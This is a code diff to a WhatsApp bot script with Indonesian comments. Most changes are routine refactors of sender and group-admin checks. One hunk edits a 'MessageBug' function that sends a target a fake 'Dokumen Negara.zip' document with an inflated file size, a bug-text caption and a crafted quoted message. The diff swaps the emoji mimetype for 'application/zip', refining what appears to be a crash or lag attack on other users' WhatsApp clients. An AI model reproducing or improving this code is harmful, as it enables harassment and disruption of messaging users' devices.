@@ -12,7 +12,7 @@ const isCmd = body.startsWith(prefix)
 const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
 const cmd = prefix + command
 const args = body.trim().split(/ +/).slice(1)
-let crypto = require('crypto')
+const crypto = require('crypto')
 const makeid = crypto.randomBytes(3).toString('hex')
 const { Client } = require('ssh2');
 const quoted = m.quoted ? m.quoted : m
@@ -25,12 +25,12 @@ const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumb
 const isGroup = m.chat.endsWith('@g.us')
 const senderNumber = m.sender.split('@')[0]
 const pushname = m.pushName || `${senderNumber}`
-const isBot = botNumber.includes(senderNumber)
+const isBot = m.sender == botNumber
 const groupMetadata = isGroup ? await lubyz.groupMetadata(m.chat) : {}
-let participant_bot = isGroup ? groupMetadata.participants.find((v) => v.id == botNumber) : {}
-let participant_sender = isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}
-const isBotAdmin = participant_bot?.admin !== null ? true : false
-const isAdmin = participant_sender?.admin !== null ? true : false
+let participant_bot = isGroup ? groupMetadata.participants.find((v) => v.id == botNumber) : undefined
+let participant_sender = isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : undefined
+const isBotAdmin = participant_bot?.admin !== null && participant_bot?.admin !== undefined ? true : false
+const isAdmin = participant_sender?.admin !== null && participant_sender?.admin !== undefined ? true : false
 const { version } = require("./package.json")
 const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./all/function.js')
 const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
@@ -71,7 +71,7 @@ const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '
 }}}
 
 const MessageBug = async (target) => {
-return lubyz.sendMessage(target, {document: fs.readFileSync("./package.json"), mimetype: "😄😇😂🔥", fileName: "Dokumen Negara.zip", fileLength: 99999999999, caption: `key.com${teksbug2}`}, {quoted: qbug})
+return lubyz.sendMessage(target, {document: fs.readFileSync("./package.json"), mimetype: "application/zip", fileName: "Dokumen Negara.zip", fileLength: 99999999999, caption: `key.com${teksbug2}`}, {quoted: qbug})
 }
 
 let ppuser
